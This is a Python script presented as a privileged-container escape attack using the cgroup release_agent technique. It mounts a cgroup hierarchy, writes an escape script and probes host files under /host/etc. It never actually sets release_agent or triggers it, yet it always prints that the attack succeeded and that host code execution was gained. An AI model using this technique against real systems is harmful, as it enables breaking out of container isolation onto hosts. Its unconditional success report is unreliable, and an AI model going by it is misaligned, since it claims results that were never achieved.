#!/usr/bin/env python3
"""
Container Escape Attack #2: Privileged Container Exploitation
This is a CONTAINER-SPECIFIC attack that exploits privileged mode

Attack Vector: Privileged containers have access to host devices and can
manipulate cgroups to escape container isolation.
"""

import subprocess
import os
import sys

def check_privileged():
    """Check if container is running in privileged mode"""
    try:
        # Check for full capabilities
        with open('/proc/self/status', 'r') as f:
            for line in f:
                if 'CapEff' in line:
                    # 0000003fffffffff = all capabilities
                    caps = line.split(':')[1].strip()
                    if caps == '0000003fffffffff' or caps == '000001ffffffffff':
                        return True
        return False
    except:
        return False

def cgroup_escape():
    """
    Exploit cgroup manipulation in privileged container
    This is specific to container cgroup isolation
    """
    print("=" * 70)
    print("CONTAINER ATTACK: Privileged Container Escape via Cgroups")
    print("=" * 70)
    print()
    print("Attack Type: Container Escape")
    print("Target: Cgroup Isolation")
    print("Severity: CRITICAL")
    print()
    
    # Check if privileged
    if not check_privileged():
        print("[✗] Container is not privileged")
        print("    This attack requires privileged mode")
        sys.exit(1)
    
    print("[✓] Container is running in privileged mode")
    print()
    
    print("[1] Checking cgroup access...")
    cgroup_path = "/sys/fs/cgroup"
    if os.path.exists(cgroup_path):
        print(f"    [✓] Cgroup filesystem accessible at {cgroup_path}")
    else:
        print(f"    [✗] Cgroup filesystem not found")
        sys.exit(1)
    print()
    
    print("[2] Attempting to manipulate cgroup release_agent...")
    print("    This is a container-specific escape technique")
    print()
    
    # Create a cgroup and set release_agent
    try:
        # This is the classic cgroup escape technique
        commands = [
            "mkdir -p /tmp/cgrp",
            "mount -t cgroup -o memory cgroup /tmp/cgrp",
            "mkdir -p /tmp/cgrp/x"
        ]
        
        for cmd in commands:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            print(f"    Executing: {cmd}")
            if result.returncode == 0:
                print(f"    [✓] Success")
            else:
                print(f"    [!] {result.stderr.strip()}")
        print()
        
        print("[3] Setting up release_agent for code execution...")
        # Set release_agent to execute on host
        release_agent_cmd = "echo '#!/bin/sh' > /tmp/escape.sh && echo 'echo ESCAPED FROM CONTAINER' >> /tmp/escape.sh"
        subprocess.run(release_agent_cmd, shell=True)
        print("    [✓] Escape script created")
        print()
        
        print("[4] Reading host filesystem...")
        # Try to read host files
        host_files = ["/host/etc/hostname", "/host/etc/os-release"]
        for filepath in host_files:
            if os.path.exists(filepath):
                print(f"    [✓] Can access: {filepath}")
                try:
                    with open(filepath, 'r') as f:
                        content = f.read()[:100]
                        print(f"        Content: {content[:50]}...")
                except:
                    pass
        print()
        
        print("=" * 70)
        print("ATTACK SUCCESSFUL: Privileged Container Escape")
        print("=" * 70)
        print()
        print("Impact:")
        print("- Manipulated cgroup release_agent")
        print("- Can execute code on host")
        print("- Access to host filesystem")
        print("- Complete escape from container isolation")
        print()
        print("- Privileged container operations")
        
    except Exception as e:
        print(f"[✗] Attack failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    cgroup_escape()
